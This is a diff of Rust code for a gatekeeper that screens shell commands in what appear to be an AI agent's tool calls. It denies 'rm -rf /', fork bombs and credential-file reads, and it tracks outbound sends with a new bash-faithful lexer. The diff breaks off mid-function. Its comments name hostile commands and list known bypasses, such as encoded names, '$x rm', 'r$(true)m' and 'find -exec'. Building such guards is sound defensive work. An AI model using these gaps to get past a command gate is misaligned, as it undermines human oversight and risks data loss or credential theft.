@@ -6,13 +6,16 @@
 //! - Only command words are inspected, so `echo "rm -rf /"` and `grep mkfs`
 //!   are allowed. A command word is the first word of a stage after wrappers
 //!   (`sudo`, `xargs`, ...), flags, `VAR=value` and keywords.
-//! - A newline splits commands, so a heredoc line that is exactly `rm -rf /`
-//!   is denied. That is fail-closed on purpose.
-//! - Inside double quotes only `$(`, backticks and parentheses still split,
-//!   because the shell still runs them there.
+//! - A heredoc's body is read as a script of its own, so a body line that is
+//!   exactly `rm -rf /` is denied. That is fail-closed on purpose.
+//! - A4: words are read where bash reads them ([`Lexer`]): line continuations
+//!   removed, `$(…)` and backticks opening a nested command inside double quotes
+//!   too, comments skipped, and words ended at `<` and `>`.
 //!
 //! shortcut: no `find -exec`, `sudo -u root rm`, `bash script.sh` body or
-//! `<(curl ..)` coverage; the Linux account boundary (§4.4 item 1) is the backstop.
+//! `<(curl ..)` coverage, and a command word an expansion makes (`$x rm` with `x`
+//! unset, `r$(true)m`) is not seen; the Linux account boundary (§4.4 item 1) is the
+//! backstop.
 //!
 //! Credential files and `/proc/*/environ` are refused by name in any tool's path and in any
 //! bash word (`sensitive`). shortcut: a glob, a variable or an encoded name gets past it, and a
@@ -188,7 +191,7 @@ struct Stage {
 }
 
 fn check_bash(command: &str) -> Decision {
-    if is_fork_bomb(command) {
+    if is_fork_bomb(&join_continued(command)) {
         return Decision::Deny("fork bomb");
     }
     let stages = stages(command);
@@ -381,8 +384,9 @@ pub const UNKNOWN: &str = "unknown";
 /// `classes(server, tool)` is the owner's per-connector table: `Some(Some(c))` puts the tool in a
 /// class, `Some(None)` takes it out of all, `None` leaves the verb rule.
 ///
-/// R28: a command is also classified as a de-quoted copy (every `'`, `"`, `` ` `` and `\` a
-/// space), so a quote the tokenizer misreads (`"$(printf '"')"`) cannot swallow a send. No target is read
+/// R28: a command is also classified as a de-quoted copy (its line continuations removed, then
+/// every `'`, `"`, `` ` `` and `\` a space, and every `#`, `${…}` and heredoc read as code), so a
+/// quote the tokenizer misreads (`"${x:-"'"}"`) cannot swallow a send. No target is read
 /// from that copy: a send it finds that the plain scan did not (by the send's own text) counts
 /// with target `unknown`. A send whose quoted text holds `;`, `&` or `|` (or, single-quoted,
 /// `(`, `)` or a backtick) on its own line splits differently in the copy, so it also gains
@@ -396,7 +400,7 @@ pub fn gated(
         "bash" | "exec" => {
             let command = args.get("command")?.as_str()?;
             let mut found = gated_command(command, 0, true);
-            let plain = command.replace(['\'', '"', '`', '\\'], " ");
+            let plain = join_continued(command).replace(['\'', '"', '`', '\\'], " ");
             for item in gated_command(&plain, 0, false) {
                 if !found.iter().any(|f| f.stage == item.stage) {
                     found.push(item);
@@ -821,7 +825,12 @@ fn other_stdin(word: &str) -> bool {
 }
 
 fn scan_stages(text: &str, heredocs: &[Heredoc], depth: usize, read: bool, found: &mut Vec<Item>) {
-    let all = stages(text);
+    // the de-quoted copy reads every `#`, `${…}` and heredoc as code (R26)
+    let all = if read {
+        stages(text)
+    } else {
+        loose_stages(text)
+    };
     let mut add = |item: Item| {
         if !found.contains(&item) {
             found.push(item);
@@ -1044,8 +1053,9 @@ fn header_block(h: &Heredoc) -> Option<Vec<String>> {
 /// Replaces each plausible heredoc operator with `<<__HEREDOC_k__`, keeping every line of the
 /// text (bodies included, so they are scanned too), and returns the bodies. An operator counts
 /// only outside quotes, comments and `((...))`/`$[...]` arithmetic, with a delimiter word and a
-/// terminator line after it. The parse is approximate on purpose: it only feeds recipients,
-/// and a miss gives `unknown`.
+/// terminator line after it ([`heredoc_end`], as bash finds it). A4: a line that ends in a line
+/// continuation is read as one with the next, as bash reads it. The parse is approximate on
+/// purpose: it only feeds recipients, and a miss gives `unknown`.
 fn mark_heredocs(command: &str) -> (String, Vec<Heredoc>) {
     struct Op {
         start: usize,
@@ -1063,103 +1073,115 @@ fn mark_heredocs(command: &str) -> (String, Vec<Heredoc>) {
     let mut bracket = 0usize;
     let mut idx = 0;
     while idx < lines.len() {
-        let line = lines[idx];
+        let mut line = lines[idx].to_string();
         idx += 1;
-        let chars: Vec<(usize, char)> = line.char_indices().collect();
-        let mut ops: Vec<Op> = Vec::new();
-        // R65: the unquoted `$`s just read in a row; bash pairs them (`$$` is the pid).
-        let mut dollars = 0usize;
-        let mut i = 0;
-        while i < chars.len() {
-            let (pos, c) = chars[i];
-            let next = chars.get(i + 1).map(|x| x.1);
-            let prev = i.checked_sub(1).map(|j| chars[j].1);
-            let run = std::mem::take(&mut dollars);
-            let unpaired = run.is_multiple_of(2);
-            if let Some(q) = quote {
-                if c == '\\' && q != '\'' {
-                    i += 1;
-                } else if c == q || (q == 'A' && c == '\'') {
-                    quote = None;
-                }
-            } else if c == '\\' {
-                i += 1;
-            } else if c == '$' && unpaired && next == Some('\'') {
-                quote = Some('A');
-                i += 1;
-            } else if c == '\'' || c == '"' {
-                quote = Some(c);
-            } else if c == '$' && unpaired && next == Some('[') {
-                bracket += 1;
-                i += 1;
-            } else if c == '$' {
-                dollars = run + 1;
-            } else if c == ']' && bracket > 0 {
-                bracket -= 1;
-            } else if c == '(' && next == Some('(') {
-                arith += 1;
-                i += 1;
-            } else if c == ')' && next == Some(')') && arith > 0 {
-                arith -= 1;
-                i += 1;
-            } else if c == '#' && prev.is_none_or(|p| p.is_whitespace() || ";|&(".contains(p)) {
-                break; // a comment runs to the end of the line
-            } else if c == '<' && next == Some('<') && arith == 0 && bracket == 0 {
-                if chars.get(i + 2).map(|x| x.1) == Some('<') {
-                    i += 2; // here-string
-                } else {
-                    let after = &line[pos + 2..];
-                    let strip_tabs = after.starts_with('-');
-                    let body = after.strip_prefix('-').unwrap_or(after);
-                    let body_start = pos + 2 + (after.len() - body.len());
-                    let trimmed = body.trim_start();
-                    let word_start = body_start + (body.len() - trimmed.len());
-                    let q = trimmed.chars().next().filter(|c| *c == '\'' || *c == '"');
-                    let word = match q {
-                        Some(q) => trimmed[1..]
-                            .find(q)
-                            .map(|e| (&trimmed[1..1 + e], word_start + e + 2, true)),
-                        None => {
-                            let e = trimmed
-                                .find(|c: char| c.is_whitespace() || ";|&<>()".contains(c))
-                                .unwrap_or(trimmed.len());
-                            let w = &trimmed[..e];
-                            Some((w, word_start + e, w.starts_with('\\')))
-                        }
-                    };
-                    if let Some((delim, end, quoted)) = word {
-                        let delim = delim.trim_start_matches('\\');
-                        if !delim.is_empty() {
-                            ops.push(Op {
-                                start: pos,
-                                end,
-                                delim: delim.to_string(),
-                                strip_tabs,
-                                quoted,
-                            });
-                            while i < chars.len() && chars[i].0 < end {
-                                i += 1;
-                            }
-                            continue;
-                        }
+        let at_start = (quote, arith, bracket);
+        let mut ops: Vec<Op>;
+        loop {
+            let chars: Vec<(usize, char)> = line.char_indices().collect();
+            ops = Vec::new();
+            let mut comment = false;
+            // R65: the unquoted `$`s just read in a row; bash pairs them (`$$` is the pid).
+            let mut dollars = 0usize;
+            let mut i = 0;
+            while i < chars.len() {
+                let (pos, c) = chars[i];
+                let next = chars.get(i + 1).map(|x| x.1);
+                let prev = i.checked_sub(1).map(|j| chars[j].1);
+                let run = std::mem::take(&mut dollars);
+                let unpaired = run.is_multiple_of(2);
+                if let Some(q) = quote {
+                    if c == '\\' && q != '\'' {
+                        i += 1;
+                    } else if c == q || (q == 'A' && c == '\'') {
+                        quote = None;
                     }
+                } else if c == '\\' {
                     i += 1;
+                } else if c == '$' && unpaired && next == Some('\'') {
+                    quote = Some('A');
+                    i += 1;
+                } else if c == '\'' || c == '"' {
+                    quote = Some(c);
+                } else if c == '$' && unpaired && next == Some('[') {
+                    bracket += 1;
+                    i += 1;
+                } else if c == '$' {
+                    dollars = run + 1;
+                } else if c == ']' && bracket > 0 {
+                    bracket -= 1;
+                } else if c == '(' && next == Some('(') {
+                    arith += 1;
+                    i += 1;
+                } else if c == ')' && next == Some(')') && arith > 0 {
+                    arith -= 1;
+                    i += 1;
+                } else if c == '#' && prev.is_none_or(|p| p.is_whitespace() || ";|&(".contains(p)) {
+                    comment = true;
+                    break; // a comment runs to the end of the line
+                } else if c == '<' && next == Some('<') && arith == 0 && bracket == 0 {
+                    if chars.get(i + 2).map(|x| x.1) == Some('<') {
+                        i += 2; // here-string
+                    } else {
+                        let after = &line[pos + 2..];
+                        let strip_tabs = after.starts_with('-');
+                        let body = after.strip_prefix('-').unwrap_or(after);
+                        let body_start = pos + 2 + (after.len() - body.len());
+                        let trimmed = body.trim_start();
+                        let word_start = body_start + (body.len() - trimmed.len());
+                        let q = trimmed.chars().next().filter(|c| *c == '\'' || *c == '"');
+                        let word = match q {
+                            Some(q) => trimmed[1..]
+                                .find(q)
+                                .map(|e| (&trimmed[1..1 + e], word_start + e + 2, true)),
+                            None => {
+                                let e = trimmed
+                                    .find(|c: char| c.is_whitespace() || ";|&<>()".contains(c))
+                                    .unwrap_or(trimmed.len());
+                                let w = &trimmed[..e];
+                                Some((w, word_start + e, w.starts_with('\\')))
+                            }
+                        };
+                        if let Some((delim, end, quoted)) = word {
+                            let delim = delim.trim_start_matches('\\');
+                            if !delim.is_empty() {
+                                ops.push(Op {
+                                    start: pos,
+                                    end,
+                                    delim: delim.to_string(),
+                                    strip_tabs,
+                                    quoted,
+                                });
+                                while i < chars.len() && chars[i].0 < end {
+                                    i += 1;
+                                }
+                                continue;
+                            }
+                        }
+                        i += 1;
+                    }
                 }
+                i += 1;
             }
-            i += 1;
+            // a `\` no `\` escapes ends the line, outside `'…'`, `$'…'` and a comment
+            let slashes = line.chars().rev().take_while(|c| *c == '\\').count();
+            let continued =
+                !comment && matches!(quote, None | Some('"')) && !slashes.is_multiple_of(2);
+            if !continued || idx >= lines.len() {
+                break;
+            }
+            // bash joins the next line to this one, and reads the joined line from where this began
+            line.pop();
+            line.push_str(lines[idx]);
+            idx += 1;
+            (quote, arith, bracket) = at_start;
         }
         let mut placed: Vec<Option<usize>> = Vec::new();
         let mut body_end = idx;
         for op in &ops {
-            let found = (body_end..lines.len()).find(|&j| {
-                let l = lines[j];
-                let t = if op.strip_tabs {
-                    l.trim_start_matches('\t')
-                } else {
-                    l
-                };
-                t.trim_end() == op.delim
-            });
+            let rest = lines[body_end..].iter().copied();
+            let found =
+                heredoc_end(rest, &op.delim, op.strip_tabs, op.quoted).map(|k| body_end + k);
             match found {
                 Some(j) => {
                     let mut body = lines[body_end..j].join("\n");
@@ -1966,14 +1988,14 @@ fn check_path(raw: &str) -> Decision {
 /// byte, uppercased (`\cĀ` is 0x04 and then the rest of `Ā`; `\c?` is 0x7f; `\c\\` takes both
 /// backslashes). The bytes are read as UTF-8, so `\xe2\x80\x8b` is one character, and the text
 /// ends at its first NUL (R67: `\0`, `\x00`, `\c@`, `\u0000`, ...).
-fn ansi_c(chars: &mut std::iter::Peekable<std::str::Chars>, out: &mut String) {
+fn ansi_c(src: &mut Src, out: &mut String) {
     let mut raw = String::new();
-    while let Some(c) = chars.next() {
+    while let Some(c) = src.raw() {
         match c {
             '\'' => break,
             '\\' => {
                 raw.push(c);
-                raw.extend(chars.next());
+                raw.extend(src.raw());
             }
             c => raw.push(c),
         }
@@ -2075,108 +2097,814 @@ fn ansi_c(chars: &mut std::iter::Peekable<std::str::Chars>, out: &mut String) {
 
 /// Split a command into stages. Words have their quotes removed, and ANSI-C strings decoded.
 fn stages(command: &str) -> Vec<Stage> {
-    fn end_word(word: &mut Option<String>, words: &mut Vec<String>) {
-        if let Some(w) = word.take() {
-            words.push(w);
+    Lexer::new(command, 0, false).run()
+}
+
+/// [`stages`] for the de-quoted copy of a command (R28), where every `#`, `${…}` and heredoc is
+/// read as plain code, as before A4, so nothing the copy holds is skipped as a comment or a body.
+fn loose_stages(command: &str) -> Vec<Stage> {
+    Lexer::new(command, 0, true).run()
+}
+
+/// `text` with its line continuations (a `\` that no `\` escapes, and the newline after it)
+/// removed wherever they are, for the readers that look at a command's raw text.
+fn join_continued(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut chars = text.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '\\' {
+            match chars.next() {
+                Some('\n') => {}
+                Some(n) => {
+                    out.push(c);
+                    out.push(n);
+                }
+                None => out.push(c),
+            }
+        } else {
+            out.push(c);
         }
     }
-    fn end_stage(words: &mut Vec<String>, out: &mut Vec<Stage>, piped: bool) {
-        if !words.is_empty() {
-            out.push(Stage {
-                words: std::mem::take(words),
+    out
+}
+
+/// A command's characters as bash reads them (A4): `next` and `peek` skip each line
+/// continuation (a `\` and the newline after it), which bash removes outside single quotes,
+/// `$'…'` and comments; those are read with `raw`. Nothing at or past `end` is read: a heredoc's
+/// body ends there.
+struct Src {
+    c: Vec<char>,
+    i: usize,
+    end: usize,
+}
+
+impl Src {
+    fn new(text: &str) -> Src {
+        let c: Vec<char> = text.chars().collect();
+        Src {
+            end: c.len(),
+            c,
+            i: 0,
+        }
+    }
+
+    /// `i`, moved past the line continuations that start there.
+    fn skip(&self, mut i: usize) -> usize {
+        while i + 1 < self.end && self.c[i] == '\\' && self.c[i + 1] == '\n' {
+            i += 2;
+        }
+        i
+    }
+
+    fn at(&self, i: usize) -> Option<char> {
+        (i < self.end).then(|| self.c[i])
+    }
+
+    fn peek(&self) -> Option<char> {
+        self.at(self.skip(self.i))
+    }
+
+    fn next(&mut self) -> Option<char> {
+        self.i = self.skip(self.i);
+        let c = self.at(self.i)?;
+        self.i += 1;
+        Some(c)
+    }
+
+    fn raw(&mut self) -> Option<char> {
+        let c = self.at(self.i)?;
+        self.i += 1;
+        Some(c)
+    }
+
+    fn raw_peek(&self) -> Option<char> {
+        self.at(self.i)
+    }
+}
+
+/// Reserved words a command may follow, so `then case` still opens a `case`.
+const LEADERS: &[&str] = &[
+    "if", "then", "elif", "else", "do", "while", "until", "{", "!", "time",
+];
+
+/// How deep backticks are read into one another; past it a backtick only splits, as before A4.
+const MAX_TICKS: usize = 16;
+
+/// What an open `case` statement reads next.
+#[derive(Clone, Copy, PartialEq)]
+enum Case {
+    Subject,
+    In,
+    /// `first`: no word of the pattern read yet, so `esac` ends the statement.
+    Pattern {
+        first: bool,
+    },
+    Body,
+}
+
+/// A heredoc operator read on the current line, whose body starts after the line.
+struct PendingHeredoc {
+    delim: String,
+    strip_tabs: bool,
+    quoted: bool,
+}
+
+/// After `<<`: where the delimiter starts in the word (0: the next word), `<<-`, and whether the
+/// delimiter has a quoted part so far.
+#[derive(Clone, Copy)]
+struct Delim {
+    at: usize,
+    strip_tabs: bool,
+    quoted: bool,
+}
+
+/// Unquoted text: the top level, a `$(…)`, or a heredoc's body.
+struct Code {
+    /// A `$(…)`, which a `)` ends when no parenthesis is open in it.
+    sub: bool,
+    /// The parentheses open in it, true for arithmetic (`((…))`, `$((…))`).
+    parens: Vec<bool>,
+    /// The `$[…]` open in it (arithmetic too).
+    brackets: usize,
+    /// Its open `case` statements, with the parentheses open where each began.
+    cases: Vec<(Case, usize)>,
+    /// The next word would be a command's first, where `case` and `esac` are reserved words.
+    cmd: bool,
+    heredocs: Vec<PendingHeredoc>,
+    delim: Option<Delim>,
+}
+
+impl Code {
+    fn new(sub: bool) -> Code {
+        Code {
+            sub,
+            parens: Vec::new(),
+            brackets: 0,
+            cases: Vec::new(),
+            cmd: true,
+            heredocs: Vec::new(),
+            delim: None,
+        }
+    }
+
+    /// Inside arithmetic, where `#` starts no comment and `<<` is a shift.
+    fn arith(&self) -> bool {
+        self.brackets > 0 || self.parens.contains(&true)
+    }
+
+    /// A command boundary: the next word is a command's first.
+    fn split(&mut self) {
+        self.cmd = true;
+        self.delim = None;
+    }
+
+    /// A word (or a part of one, ended by a substitution) read in this code: steps the `case`
+    /// statement open at this depth. `plain`: no part of it was quoted or escaped; `lead`: it
+    /// began where a command does.
+    fn word(&mut self, w: &str, plain: bool, lead: bool) {
+        let depth = self.parens.len();
+        let reserved = |k: &str| plain && w == k;
+        match self.cases.last_mut() {
+            Some((state, d)) if *d == depth => match *state {
+                Case::Subject => *state = Case::In,
+                Case::In => {
+                    if reserved("in") {
+                        *state = Case::Pattern { first: true };
+                    }
+                }
+                Case::Pattern { first } => {
+                    if first && reserved("esac") {
+                        self.cases.pop();
+                    } else {
+                        *state = Case::Pattern { first: false };
+                    }
+                }
+                Case::Body => {
+                    if lead && reserved("esac") {
+                        self.cases.pop();
+                    } else if lead && reserved("case") {
+                        self.cases.push((Case::Subject, depth));
+                    }
+                }
+            },
+            _ => {
+                if lead && reserved("case") {
+                    self.cases.push((Case::Subject, depth));
+                }
+            }
+        }
+        if lead && plain && LEADERS.contains(&w) {
+            self.cmd = true;
+        }
+    }
+
+    /// The `case` statement open at the current depth of parentheses.
+    fn case_at(&mut self) -> Option<&mut Case> {
+        let depth = self.parens.len();
+        match self.cases.last_mut() {
+            Some((state, d)) if *d == depth => Some(state),
+            _ => None,
+        }
+    }
+}
+
+/// A heredoc's body being read: the bodies after it on the same line, where to go on reading
+/// after the last, and where the text it was read from ends.
+struct Bodies {
+    rest: Vec<(usize, usize)>,
+    resume: usize,
+    end: usize,
+}
+
+enum Ctx {
+    Code(Code),
+    Double,
+    /// `${…}`, outside double quotes: one word up to its `}`.
+    Brace,
+    Body(Bodies),
+}
+
+/// The quote-aware tokenizer behind [`stages`] (A4). It reads a command as bash does, so a
+/// command inside another (a `$(…)`, a backtick, a heredoc fed to a shell) is found and nothing
+/// after it is misread: line continuations are removed (not inside single quotes, `$'…'` or a
+/// comment); a `$(…)` or a backtick opens a nested command inside double quotes as outside them,
+/// its own quotes nesting; `$(…)` ends at the `)` bash ends it at, past the parentheses open in
+/// it, a `case` pattern's `)`, a `${…}`, a comment and a heredoc's body; a backtick ends at the
+/// first backtick no `\` escapes and is read again unescaped; a comment runs to its newline; a
+/// heredoc's body is read as its own script and ends only at its exact delimiter line; a word
+/// ends at `<` and `>`, so `rm>f` is `rm` (an fd number and the operator's own characters stay
+/// with the operator: `2>&1`).
+///
+/// Every command it finds is a stage, so a nested one splits the word around it (fail-closed:
+/// `a$(b)c` is the stages `a$`, `b` and `c`). Inside double quotes `(` and `)` split too.
+///
+/// shortcut: `${…}` inside double quotes is read as text, so a quote inside it (`"${x:-"'"}"`)
+/// is misread; the de-quoted copy (R28) is the backstop for `gated`.
+struct Lexer {
+    src: Src,
+    out: Vec<Stage>,
+    words: Vec<String>,
+    word: Option<String>,
+    /// The word has a quoted or escaped part, so it is no reserved word.
+    quoted: bool,
+    /// The word began where a command does.
+    lead: bool,
+    prev: char,
+    /// R65: the unquoted `$`s just read in a row. Bash pairs them (`$$` is the shell's pid), so
+    /// only an unpaired one starts `$'…'`, `$"…"`, `$(…)`, `${…}` or `$[…]`.
+    dollars: usize,
+    stack: Vec<Ctx>,
+    /// How many backticks this text is inside.
+    ticks: usize,
+    /// The de-quoted copy: no comments, `${…}` or heredoc bodies.
+    loose: bool,
+}
+
+impl Lexer {
+    fn new(text: &str, ticks: usize, loose: bool) -> Lexer {
+        Lexer {
+            src: Src::new(text),
+            out: Vec::new(),
+            words: Vec::new(),
+            word: None,
+            quoted: false,
+            lead: false,
+            prev: ' ',
+            dollars: 0,
+            stack: vec![Ctx::Code(Code::new(false))],
+            ticks,
+            loose,
+        }
+    }
+
+    fn run(mut self) -> Vec<Stage> {
+        loop {
+            let Some(c) = self.src.next() else {
+                if self.end_body() {
+                    continue;
+                }
+                break;
+            };
+            let run = std::mem::take(&mut self.dollars);
+            match self.stack.last() {
+                Some(Ctx::Double) => self.double(c, run),
+                Some(Ctx::Brace) => self.brace(c, run),
+                _ => self.code(c, run),
+            }
+        }
+        self.end_word();
+        self.end_stage(false);
+        self.out
+    }
+
+    /// The innermost unquoted text: the one a word read now belongs to.
+    fn code_mut(&mut self) -> &mut Code {
+        let at = self.stack.iter().rposition(|c| matches!(c, Ctx::Code(_)));
+        match at.map(|i| &mut self.stack[i]) {
+            Some(Ctx::Code(code)) => code,
+            _ => unreachable!("the stack always holds the top level's code"),
+        }
+    }
+
+    fn code_ref(&self) -> &Code {
+        match self.stack.iter().rev().find(|c| matches!(c, Ctx::Code(_))) {
+            Some(Ctx::Code(code)) => code,
+            _ => unreachable!("the stack always holds the top level's code"),
+        }
+    }
+
+    fn word_mut(&mut self) -> &mut String {
+        if self.word.is_none() {
+            let code = self.code_mut();
+            let lead = std::mem::replace(&mut code.cmd, false);
+            self.lead = lead;
+        }
+        self.word.get_or_insert_with(String::new)
+    }
+
+    fn push(&mut self, c: char) {
+        self.word_mut().push(c);
+    }
+
+    /// The word has a quoted part (and so has a heredoc delimiter being read).
+    fn quote(&mut self) {
+        self.word_mut();
+        self.quoted = true;
+        if let Some(d) = &mut self.code_mut().delim {
+            d.quoted = true;
+        }
+    }
+
+    fn end_word(&mut self) {
+        let Some(w) = self.word.take() else {
+            return;
+        };
+        let plain = !std::mem::take(&mut self.quoted);
+        let lead = std::mem::take(&mut self.lead);
+        let in_code = matches!(self.stack.last(), Some(Ctx::Code(_)));
+        let code = self.code_mut();
+        if let Some(d) = code.delim.take().filter(|_| in_code) {
+            let delim = w.get(d.at..).unwrap_or_default();
+            if delim.is_empty() && d.at > 0 {
+                code.delim = Some(Delim { at: 0, ..d }); // `<< EOF`: the next word
+            } else if !delim.is_empty() {
+                code.heredocs.push(PendingHeredoc {
+                    delim: delim.to_string(),
+                    strip_tabs: d.strip_tabs,
+                    quoted: d.quoted,
+                });
+            }
+        }
+        code.word(&w, plain, lead);
+        self.words.push(w);
+    }
+
+    fn end_stage(&mut self, piped: bool) {
+        if !self.words.is_empty() {
+            self.out.push(Stage {
+                words: std::mem::take(&mut self.words),
                 piped,
             });
         }
     }
 
-    let mut out = Vec::new();
-    let mut words = Vec::new();
-    let mut word: Option<String> = None;
-    let mut quote: Option<char> = None;
-    let mut prev = ' ';
-    // R65: the unquoted `$`s just read in a row. Bash pairs them (`$$` is the shell's pid), so
-    // only an unpaired one starts `$'…'` or `$"…"`.
-    let mut dollars = 0usize;
-    let mut chars = command.chars().peekable();
-    while let Some(c) = chars.next() {
-        let run = std::mem::take(&mut dollars);
-        let paired = !run.is_multiple_of(2);
-        match quote {
-            Some('\'') => {
-                if c == '\'' {
-                    quote = None;
-                } else {
-                    word.get_or_insert_with(String::new).push(c);
+    /// A word, a stage and the current command end at a separator.
+    fn split(&mut self) {
+        self.end_word();
+        self.end_stage(false);
+        self.code_mut().split();
+    }
+
+    /// A `$(…)` (or `$((…))`) starts: it splits the word around it and is read as code.
+    fn open_sub(&mut self) {
+        let code = self.code_mut();
+        code.delim = None;
+        code.cmd = false;
+        self.end_word();
+        self.end_stage(false);
+        let mut sub = Code::new(true);
+        if self.src.peek() == Some('(') {
+            self.src.next();
+            sub.parens.push(true);
+        }
+        self.stack.push(Ctx::Code(sub));
+        self.prev = '(';
+    }
+
+    /// A backtick's command: read up to the first backtick no `\` escapes, unescaped as bash
+    /// does (`\$`, `` \` ``, `\\`, and `\"` inside double quotes), as its own script.
+    fn backtick(&mut self, in_double: bool) {
+        let code = self.code_mut();
+        code.delim = None;
+        code.cmd = false;
+        self.end_word();
+        self.end_stage(false);
+        self.prev = '`';
+        if self.ticks >= MAX_TICKS {
+            return;
+        }
+        let mut script = String::new();
+        while let Some(c) = self.src.next() {
+            match c {
+                '`' => break,
+                '\\' => {
+                    let Some(n) = self.src.raw() else {
+                        script.push(c);
+                        break;
+                    };
+                    if !(matches!(n, '$' | '`' | '\\') || (in_double && n == '"')) {
+                        script.push(c);
+                    }
+                    script.push(n);
+                }
+                c => script.push(c),
+            }
+        }
+        let inner = Lexer::new(&script, self.ticks + 1, self.loose).run();
+        self.out.extend(inner);
+    }
+
+    /// A single-quoted string's text, up to its closing quote.
+    fn single(&mut self) {
+        self.quote();
+        while let Some(c) = self.src.raw() {
+            if c == '\'' {
+                break;
+            }
+            self.push(c);
+        }
+        self.prev = '\'';
+    }
+
+    /// Unquoted text.
+    fn code(&mut self, c: char, run: usize) {
+        let unpaired = !run.is_multiple_of(2); // an unpaired `$` just before `c`
+        let peek = self.src.peek();
+        match c {
+            // A3: `$'…'` is the text bash makes of it, escapes decoded.
+            '$' if run.is_multiple_of(2) && peek == Some('\'') => {
+                self.src.next();
+                self.quote();
+                let mut w = self.word.take().unwrap_or_default();
+                ansi_c(&mut self.src, &mut w);
+                self.word = Some(w);
+                self.prev = '\'';
+                return;
+            }
+            // `$"…"` is a locale string, which bash reads as a double-quoted one.
+            '$' if run.is_multiple_of(2) && peek == Some('"') => {
+                self.src.next();
+                self.quote();
+                self.stack.push(Ctx::Double);
+            }
+            '$' => {
+                self.push(c);
+                self.dollars = run + 1;
+            }
+            '\'' => return self.single(),
+            '"' => {
+                self.quote();
+                self.stack.push(Ctx::Double);
+            }
+            '\\' => {
+                if let Some(n) = self.src.raw() {
+                    self.quote();
+                    self.push(n);
                 }
             }
-            Some(_) => match c {
-                '"' => quote = None,
-                '(' | ')' | '`' => {
-                    end_word(&mut word, &mut words);
-                    end_stage(&mut words, &mut out, false);
+            '`' => return self.backtick(false),
+            '{' if unpaired && !self.loose => {
+                self.push(c);
+                self.stack.push(Ctx::Brace);
+            }
+            '[' if unpaired => {
+                self.push(c);
+                self.code_mut().brackets += 1;
+            }
+            ']' if self.code_ref().brackets > 0 => {
+                self.push(c);
+                self.code_mut().brackets -= 1;
+            }
+            '#' if !self.loose && self.word.is_none() && self.comment_may_start() => {
+                while self.src.raw_peek().is_some_and(|c| c != '\n') {
+                    self.src.raw();
                 }
-                '\\' if matches!(chars.peek(), Some('"' | '\\' | '$' | '`')) => {
-                    if let Some(n) = chars.next() {
-                        word.get_or_insert_with(String::new).push(n);
+            }
+            '<' if peek == Some('<') => {
+                self.redirect();
+                self.push(c);
+                self.src.next();
+                self.push('<');
+                if self.src.peek() == Some('<') {
+                    self.src.next();
+                    self.push('<'); // a here-string
+                } else {
+                    let strip_tabs = self.src.peek() == Some('-');
+                    if strip_tabs {
+                        self.src.next();
+                        self.push('-');
+                    }
+                    let at = self.word.as_ref().map_or(0, String::len);
+                    let loose = self.loose;
+                    let code = self.code_mut();
+                    if !code.arith() && !loose {
+                        code.delim = Some(Delim {
+                            at,
+                            strip_tabs,
+                            quoted: false,
+                        });
                     }
                 }
-                _ => word.get_or_insert_with(String::new).push(c),
-            },
-            None => match c {
-                // A3: `$'…'` is the text bash makes of it, escapes decoded.
-                '$' if !paired && chars.peek() == Some(&'\'') => {
-                    chars.next();
-                    let w = word.get_or_insert_with(String::new);
-                    ansi_c(&mut chars, w);
-                    prev = '\'';
-                    continue;
-                }
-                // `$"…"` is a locale string, which bash reads as a double-quoted one.
-                '$' if !paired && chars.peek() == Some(&'"') => {
-                    word.get_or_insert_with(String::new);
-                    prev = c;
-                    continue;
-                }
-                '$' => {
-                    word.get_or_insert_with(String::new).push(c);
-                    dollars = run + 1;
-                }
-                '\'' | '"' => {
-                    quote = Some(c);
-                    word.get_or_insert_with(String::new);
-                }
-                '\\' => {
-                    if let Some(n) = chars.next() {
-                        word.get_or_insert_with(String::new).push(n);
+            }
+            '<' | '>' => {
+                self.redirect();
+                self.push(c);
+            }
+            c if c.is_whitespace() && c != '\n' => self.end_word(),
+            '\n' => {
+                self.split();
+                self.bodies();
+            }
+            ';' => {
+                // `;;`, `;&` and `;;&` end a `case` pattern's commands
+                let mut ends = false;
+                if peek == Some(';') {
+                    self.src.next();
+                    ends = true;
+                    if self.src.peek() == Some('&') {
+                        self.src.next();
                     }
+                } else if peek == Some('&') {
+                    self.src.next();
+                    ends = true;
                 }
-                c if c.is_whitespace() && c != '\n' => end_word(&mut word, &mut words),
-                ';' | '\n' | '(' | ')' | '`' => {
-                    end_word(&mut word, &mut words);
-                    end_stage(&mut words, &mut out, false);
+                self.split();
+                if let Some(state @ Case::Body) = self.code_mut().case_at().filter(|_| ends) {
+                    *state = Case::Pattern { first: true };
                 }
-                // `2>&1` and `&>file` are redirections, not background jobs.
-                '&' if !matches!(prev, '>' | '<') && chars.peek() != Some(&'>') => {
-                    end_word(&mut word, &mut words);
-                    end_stage(&mut words, &mut out, false);
+            }
+            '(' => self.open_paren(unpaired),
+            ')' => self.close_paren(),
+            // `2>&1` and `&>file` are redirections, not background jobs.
+            '&' if !matches!(self.prev, '>' | '<') && peek != Some('>') => self.split(),
+            '&' if !matches!(self.prev, '>' | '<') => {
+                self.redirect(); // `&>file`
+                self.push(c);
+            }
+            '|' => {
+                self.end_word();
+                if peek == Some('|') {
+                    self.src.next();
+                    self.end_stage(false);
+                } else {
+                    self.end_stage(true);
                 }
-                '|' => {
-                    end_word(&mut word, &mut words);
-                    if chars.peek() == Some(&'|') {
-                        chars.next();
-                        end_stage(&mut words, &mut out, false);
-                    } else {
-                        end_stage(&mut words, &mut out, true);
-                    }
-                }
-                _ => word.get_or_insert_with(String::new).push(c),
-            },
+                self.code_mut().split();
+            }
+            _ => self.push(c),
         }
-        prev = c;
+        self.prev = c;
     }
-    end_word(&mut word, &mut words);
-    end_stage(&mut words, &mut out, false);
-    out
+
+    /// A redirection operator starts a word, as bash ends words at `<` and `>` (`rm>f` is `rm`
+    /// and `>f`): only an fd number (`2>`) or the operator's own characters (`>>`, `2>&1`) may
+    /// go before it in its word.
+    fn redirect(&mut self) {
+        let operator =
+            |w: &String| w.bytes().all(|b| b.is_ascii_digit()) || w.ends_with(['<', '>', '&']);
+        if !self.word.as_ref().is_some_and(operator) {
+            self.end_word();
+        }
+    }
+
+    /// A `#` that starts a word starts a comment where bash reads one: after a blank or an
+    /// operator, and not inside arithmetic.
+    fn comment_may_start(&self) -> bool {
+        matches!(self.prev, ' ' | '\t' | '\n' | ';' | '&' | '|' | '(') && !self.code_ref().arith()
+    }
+
+    fn open_paren(&mut self, unpaired: bool) {
+        if unpaired {
+            return self.open_sub();
+        }
+        self.end_word();
+        self.end_stage(false);
